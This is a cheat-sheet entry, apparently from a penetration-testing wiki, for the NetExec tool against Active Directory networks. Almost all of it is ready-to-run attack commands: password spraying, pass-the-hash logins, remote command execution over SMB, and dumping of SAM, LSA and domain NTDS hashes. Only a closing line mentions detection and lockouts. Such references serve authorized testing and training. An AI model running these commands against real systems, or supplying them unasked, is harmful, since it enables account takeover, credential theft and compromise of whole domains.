---
name: NetExec (nxc)
category: Service Enumeration
description: Automates pentesting, poisoning and post-exploitation across AD/SMB.
tags: [ad, smb, active-directory, spray, crackmapexec, pth]
---

# NetExec (nxc)

**NetExec** (the maintained successor of CrackMapExec, `nxc`) automates enumeration, authentication and post-exploitation across large networks over SMB, WinRM, LDAP, MSSQL, SSH, RDP and more. Most Active Directory assessments lean on it heavily.

> `pipx install netexec` · [github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec) · former command: `crackmapexec`/`cme`

## Syntax

```bash
nxc <protocol> <targets> -u <user> -p <pass> [options]
```

Protocols: `smb`, `winrm`, `ldap`, `mssql`, `ssh`, `rdp`, `ftp`, `wmi`.

## SMB enumeration

```bash
nxc smb 10.0.0.0/24                               # hosts, OS, signing, SMB version
nxc smb 10.0.0.5 -u '' -p ''                       # null session
nxc smb 10.0.0.5 -u user -p pass --shares          # list shares
nxc smb 10.0.0.5 -u user -p pass --users           # domain users
nxc smb 10.0.0.5 -u user -p pass --groups
nxc smb 10.0.0.5 -u user -p pass --pass-pol        # password policy
nxc smb 10.0.0.5 -u user -p pass --sessions
```

## Credential validation & spraying

```bash
# Spray one password across many users
nxc smb 10.0.0.5 -u users.txt -p 'Winter2025!' --continue-on-success

# Test a list of creds
nxc smb 10.0.0.0/24 -u users.txt -p passwords.txt

# Pass-the-Hash
nxc smb 10.0.0.5 -u administrator -H <NTLM_HASH>
```

Look for the green **(Pwn3d!)** flag = local admin on that host.

## Command execution & dumping (with admin)

```bash
nxc smb 10.0.0.5 -u admin -p pass -x 'whoami'          # exec via cmd
nxc smb 10.0.0.5 -u admin -p pass -X '$PSVersionTable'  # exec via PowerShell
nxc smb 10.0.0.5 -u admin -p pass --sam                 # dump local SAM hashes
nxc smb 10.0.0.5 -u admin -p pass --lsa                 # dump LSA secrets
nxc smb 10.0.0.5 -u admin -p pass --ntds                # dump domain hashes (DC)
```

## Modules

```bash
nxc smb -L                                   # list modules
nxc smb 10.0.0.5 -u u -p p -M spider_plus    # crawl shares
nxc ldap 10.0.0.5 -u u -p p -M user-desc     # AD data via LDAP
```

> Extremely noisy — spraying and exec light up EDR/SIEM. Respect account lockout thresholds (`--pass-pol` first). Pairs naturally with [impacket](#/tool/impacket) and [responder](#/tool/responder).
